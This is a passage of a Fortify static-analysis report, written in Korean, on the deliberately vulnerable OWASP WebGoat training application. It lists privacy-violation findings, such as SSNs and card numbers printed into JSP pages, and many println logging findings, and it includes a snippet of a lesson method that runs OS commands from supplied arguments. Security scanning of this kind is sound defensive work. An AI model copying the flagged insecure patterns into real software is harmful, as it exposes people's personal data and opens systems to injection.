			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B7D8CC2630F2A3A11965B36B53B13CF4" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4A5D85A876AB0B30A445AAB697B4B0A1" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FD067016C70D5FB1997E5E11D4D30D7D" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="50934B47CAF8C39533054827417ABCDA" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>80</LineStart>
<Snippet>    {
	String username = s.getParser().getRawParameter(USERNAME, "");
	String password = s.getParser().getRawParameter(PASSWORD, "");

	//&lt;START_OMIT_SOURCE&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.HtmlClues.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B92F1A5E4E10E8222D47DC7CD3DB0523" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="67">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>예제 1: 개발자가 배우는 과정에서 작성하는 첫 Java 프로그램은 다음과 같습니다.


public class MyClass
  ...
    System.out.println("hello world");
  ...
}


대부분의 프로그래머가 Java의 수많은 노하우와 세부 사항을 배우게 되지만 상당수의 프로그래머가 이 첫 수업에 집착한 나머지 System.out.println()을 사용하여 표준 출력에 메시지를 쓰는 것을 그만두지 않습니다.

문제는 표준 출력이나 표준 오류에 직접 쓰는 것이 구조화되지 않은 형식의 로깅으로 이용되는 일이 잦다는 점입니다. 구조화된 로깅 기능은 로깅 수준, 단일 서식, 로거 ID, 타임스탬프 및 무엇보다 중요한, 로그 메시지를 올바른 위치에 보내는 기능 등의 기능을 제공합니다. 시스템 출력 스트림 사용이 로거를 올바로 사용하는 코드와 혼합되면 잘 기록되긴 했지만 중요한 정보가 누락된 로그가 생성됩니다.

개발자는 구조화된 로깅의 필요성을 폭넓게 이해하지만 상당수가 "운용 전" 개발 단계에서 시스템 출력 스트림을 계속 사용합니다. 검토 중인 코드가 초기 개발 단계를 지난 경우, System.out 또는 System.err 사용이 발견되면 이는 구조화된 로깅 시스템으로 옮겨가는 도중 실수한 것일 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>System.out 또는 System.err 대신 Java 로깅 기능을 사용하십시오. 

예제 2: 예를 들어, Example 1의 “hello world” 프로그램은 log4j를 사용하여 다음과 같이 다시 작성할 수 있습니다.


import org.apache.log4j.Logger;
import org.apache.log4j.BasicConfigurator;

public class MyClass {
  private final static Logger logger =
            Logger.getLogger(MyClass.class);

  ...
    BasicConfigurator.configure();
    logger.info("hello world");
  ...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer에서는 예외적으로 System.out 또는 System.err을 main() 및 메서드(main() 의 호출 계층)에 사용할 수 있으며 이러한 사용을 Poor Logging Practice:  Use of a System Output Stream 이슈로 보고하지 않습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>67</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="EE7AE2072A8D4995E05B1786939A2F45" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>394</LineStart>
<Snippet>	{
	    // what do we want to do,  I think nothing.
	    System.out.println("Warning User data for " + s.getUserName()
		    + " will not persist");
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AC0F9A7230F292396DB97EB2A516A386" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>114</LineStart>
<Snippet>	    catch (UnauthorizedException ue2)
	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9E765B5484C0C82B8FEBD880328601E5" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>365</LineStart>
<Snippet>	    catch (ValidationException ve)
	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A9034464FA6672A3BD27D9C6CF21EBCE" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>125</LineStart>
<Snippet>		catch (UnauthorizedException ue2)
		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C3FA8ADE07A225AED89A6C20F267210C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}
    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BCF58879E79AE8584B05808D3717D695" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>83</LineStart>
<Snippet>		catch (UnauthenticatedException ue1)
		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82A6475511AF948F15616E194B3E6AF7" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>306</LineStart>
<Snippet>    private Element exec(WebSession s, String command, String args)
    {
	System.out.println("Executing OS command: '" + command
		+ "' with args: '" + args + "'");
	ExecResults er = Exec.execSimple(command, args);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3C5B5D4171D615B9EF83503EE63462CD" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Logout.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Logout.java</FilePath>
<LineStart>70</LineStart>
<Snippet>	catch (UnauthenticatedException ue1)
	{
	    System.out.println("Internal server error");
	    ue1.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2798E867B1404BD55BB1C83A37DF0B5C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>478</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3C5B5D4171D615B9EF83503EE63462CE" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Logout.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Logout.java</FilePath>
<LineStart>75</LineStart>
<Snippet>	catch (UnauthorizedException ue2)
	{
	    System.out.println("Internal server error");
	    ue2.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A5C6030B921325DF8D8515310FB2389A" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>90</LineStart>
<Snippet>		catch (UnauthenticatedException ue1)
		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B1369554DF60D5C2CFB29135BCA78A56" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>988</LineStart>
<Snippet>		if ( myParser.getRawParameter( LOGOUT, null ) != null )
		{
			System.out.println( "Logout " + request.getUserPrincipal() );
			eatCookies();
			request.getSession().invalidate();</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F375DBFDFA2BC8DCDD24BD986C69B90C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>728</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Couldn't write " + message + " to " + s);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D2DF51C4B5AC23E635DD118FF1D1AE70" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>341</LineStart>
<Snippet>	    catch (ParameterNotFoundException pnfe)
	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="071779713D48448C5D8964A8EB880585" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>99</LineStart>
<Snippet>		catch (UnauthorizedException ue2)
		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="071779713D48448C5D8964A8EB880584" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>94</LineStart>
<Snippet>		catch (UnauthenticatedException ue1)
		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0234F9BD308F70B7720049C1AC563A47" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>450</LineStart>
<Snippet>	    {
		s.setMessage("You are not authorized to perform this function");
		System.out.println("Authorization failure");
		setCurrentAction(s, ERROR_ACTION);
		ue2.printStackTrace();</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2806D3EF407F7C893F96EE8C84DDD240" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>354</LineStart>
<Snippet>	    {
		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AA02F70D43073F180474686A6D9926E0" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>444</LineStart>
<Snippet>	    {
		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5E18F199AE9FE0D38996D9D8C4FD067D" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>129</LineStart>
<Snippet>	    catch (UnauthorizedException ue2)
	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="33D73E12EBA0BB8CE8A1706BB4486340" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>95</LineStart>
<Snippet>	    {
		dbName = dbName.concat("webgoat.mdb");
		System.out.println("DBName: " + dbName);
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		return DriverManager</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D3FA80DE416C223BD1F99A31A8842EB4" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1044</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="467434D9F1297B568842CF006B088CBD" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>447</LineStart>
<Snippet>		catch ( Exception e )
		{
			System.out.println( "Couldn't open database: check web.xml database parameters" );
			e.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E373102D0022EC464544A53AA638D8AE" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
